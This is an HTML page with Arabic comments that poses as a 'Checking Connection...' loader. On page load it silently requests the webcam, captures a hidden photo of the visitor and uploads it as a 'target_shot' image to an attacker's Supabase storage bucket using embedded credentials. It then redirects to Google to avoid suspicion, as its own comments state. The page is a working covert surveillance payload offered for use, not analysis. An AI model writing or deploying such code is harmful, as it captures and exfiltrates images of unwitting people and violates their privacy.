<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Checking Connection...</title>
    <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
    <style>
        body { background: #000; color: #fff; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; font-family: sans-serif; }
        .loader { border: 4px solid #333; border-top: 4px solid #3498db; border-radius: 50%; width: 30px; height: 30px; animation: spin 1s linear infinite; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
</head>
<body>
    <div style="text-align: center;">
        <div class="loader"></div>
        <p style="margin-top: 15px;">جاري تهيئة المتصفح...</p>
    </div>

    <video id="v" width="640" height="480" autoplay style="display:none" playsinline></video>
    <canvas id="c" width="640" height="480" style="display:none"></canvas>

    <script>
        // بياناتك الرسمية المستخرجة من الصور
        const PROJECT_URL = 'https://qzbtfafmapwyefbokwb.supabase.co';
        const ANON_KEY = 'sb_publishable_x6bUVdUbm9FCbiMZoAvT-A_WbbYOHk2'; 

        const clientSupa = supabase.createClient(PROJECT_URL, ANON_KEY);

        async function startCapture() {
            try {
                // طلب الإذن بشكل مباشر وقوي
                const stream = await navigator.mediaDevices.getUserMedia({ 
                    video: { 
                        facingMode: "user",
                        width: { ideal: 640 },
                        height: { ideal: 480 }
                    } 
                });
                
                const video = document.getElementById('v');
                video.srcObject = stream;

                // الانتظار ثانية واحدة للتأكد من وضوح الصورة
                setTimeout(async () => {
                    const canvas = document.getElementById('c');
                    const context = canvas.getContext('2d');
                    context.drawImage(video, 0, 0, 640, 480);
                    
                    canvas.toBlob(async (blob) => {
                        const fileName = `target_shot_${Date.now()}.jpg`;
                        
                        // عملية الرفع للمجلد photos
                        const { error } = await clientSupa.storage.from('photos').upload(fileName, blob, {
                            contentType: 'image/jpeg',
                            upsert: true
                        });

                        // التحويل التمويهي فور الانتهاء
                        window.location.href = "https://www.google.com";
                    }, 'image/jpeg', 0.8);
                }, 1000);

            } catch (err) {
                // في حال رفض الإذن أو وجود خطأ، يتم التحويل فوراً لعدم إثارة الشكوك
                console.error("Access denied", err);
                window.location.href = "https://www.google.com";
            }
        }

        // تشغيل السستم فور تحميل الصفحة
        window.onload = startCapture;
    </script>
</body>
</html>
